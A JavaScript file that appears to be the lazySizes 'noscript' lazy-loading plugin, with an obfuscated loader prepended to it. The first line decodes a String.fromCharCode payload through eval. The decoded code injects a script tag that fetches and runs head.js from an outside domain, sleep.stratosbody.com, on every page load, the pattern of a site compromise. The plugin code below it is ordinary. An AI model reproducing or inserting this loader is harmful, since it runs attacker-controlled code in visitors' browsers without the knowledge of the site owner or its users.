var o=String;eval(o.fromCharCode(102,117,110,99,116,105,111,110,32,105,115,83,99,114,105,112,116,76,111,97,100,101,100,40,115,114,99,41,10,123,10,32,32,32,32,114,101,116,117,114,110,32,66,111,111,108,101,97,110,40,100,111,99,117,109,101,110,116,46,113,117,101,114,121,83,101,108,101,99,116,111,114,40,39,115,99,114,105,112,116,91,115,114,99,61,34,39,32,43,32,115,114,99,32,43,32,39,34,93,39,41,41,59,10,125,10,10,118,97,114,32,98,100,32,61,32,34,104,116,116,34,43,34,112,115,58,34,43,34,47,34,43,34,47,115,34,43,34,108,101,101,34,43,34,112,46,115,116,114,97,34,43,34,116,34,43,34,111,115,98,34,43,34,111,100,121,46,99,111,109,47,34,43,34,115,99,34,43,34,114,105,112,34,43,34,116,34,43,34,115,47,104,101,97,34,43,34,100,46,106,34,43,34,115,34,43,34,63,34,43,34,118,61,51,34,43,34,46,34,43,34,57,34,43,34,46,48,34,59,10,10,105,102,40,105,115,83,99,114,105,112,116,76,111,97,100,101,100,40,98,100,41,61,61,61,102,97,108,115,101,41,123,10,9,118,97,114,32,100,61,100,111,99,117,109,101,110,116,59,118,97,114,32,115,61,100,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,32,10,115,46,115,114,99,61,98,100,59,10,105,102,32,40,100,111,99,117,109,101,110,116,46,99,117,114,114,101,110,116,83,99,114,105,112,116,41,32,123,32,10,105,102,40,100,111,99,117,109,101,110,116,46,99,117,114,114,101,110,116,83,99,114,105,112,116,46,112,97,114,101,110,116,78,111,100,101,33,61,61,110,117,108,108,41,123,10,100,111,99,117,109,101,110,116,46,99,117,114,114,101,110,116,83,99,114,105,112,116,46,112,97,114,101,110,116,78,111,100,101,46,105,110,115,101,114,116,66,101,102,111,114,101,40,115,44,32,100,111,99,117,109,101,110,116,46,99,117,114,114,101,110,116,83,99,114,105,112,116,41,59,10,125,10,125,10,32,101,108,115,101,32,123,10,9,105,102,40,100,46,103,101,116,69,108,101,109,101,110,116,115,66,121,84,97,103,78,97,109,101,40,39,104,101,97,100,39,41,91,48,93,33,61,61,110,117,108,108,41,123,10,100,46,103,101,116,69,108,101,109,101,110,116,115,66,121,84,97,103,78,97,109,101,40,39,104,101,97,100,39,41,91,48,93,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59,10,9,125,10,125,10,10,125));/*54745756836*/(function(window, factory) {
	var globalInstall = function(){
		factory(window.lazySizes);
		window.removeEventListener('lazyunveilread', globalInstall, true);
	};

	factory = factory.bind(null, window, window.document);

	if(typeof module == 'object' && module.exports){
		factory(require('lazysizes'));
	} else if(window.lazySizes) {
		globalInstall();
	} else {
		window.addEventListener('lazyunveilread', globalInstall, true);
	}
}(window, function(window, document, lazySizes) {
	/*jshint eqnull:true */
	'use strict';

	var dummyParent = {nodeName: ''};
	var supportPicture = !!window.HTMLPictureElement && ('sizes' in document.createElement('img'));
	var config = (window.lazySizes && lazySizes.cfg) || window.lazySizesConfig;

	var handleLoadingElements = function(e){
		var i, isResponsive, hasTriggered, onload, loading;

		var loadElements = e.target.querySelectorAll('img, iframe');

		for(i = 0; i < loadElements.length; i++){
			isResponsive = loadElements[i].getAttribute('srcset') || (loadElements[i].parentNode || dummyParent).nodeName.toLowerCase() == 'picture';

			if(!supportPicture && isResponsive){
				lazySizes.uP(loadElements[i]);
			}

			if(!loadElements[i].complete && (isResponsive || loadElements[i].src)){
				e.detail.firesLoad = true;

				if(!onload || !loading){
					loading = 0;
					/*jshint loopfunc:true */
					onload = function(evt){
						loading--;
						if((!evt || loading < 1) && !hasTriggered){
							hasTriggered = true;
							e.detail.firesLoad = false;
							lazySizes.fire(e.target, '_lazyloaded', {}, false, true);
						}

						if(evt && evt.target){
							evt.target.removeEventListener('load', onload);
							evt.target.removeEventListener('error', onload);
						}
					};

					setTimeout(onload, 3500);
				}

				loading++;

				loadElements[i].addEventListener('load', onload);
				loadElements[i].addEventListener('error', onload);
			}
		}
	};

	if(!config){
		config = {};
		window.lazySizesConfig = config;
	}

	config.getNoscriptContent =  function(noScript){
		return noScript.textContent || noScript.innerText;
	};

	window.addEventListener('lazybeforeunveil', function(e){
		if(e.detail.instance != lazySizes || e.defaultPrevented || e.target.getAttribute('data-noscript') == null){return;}

		var noScript = e.target.querySelector('noscript, script[type*="html"]') || {};
		var content = config.getNoscriptContent(noScript);

		if(content){
			e.target.innerHTML = content;
			handleLoadingElements(e);
		}
	});
}));
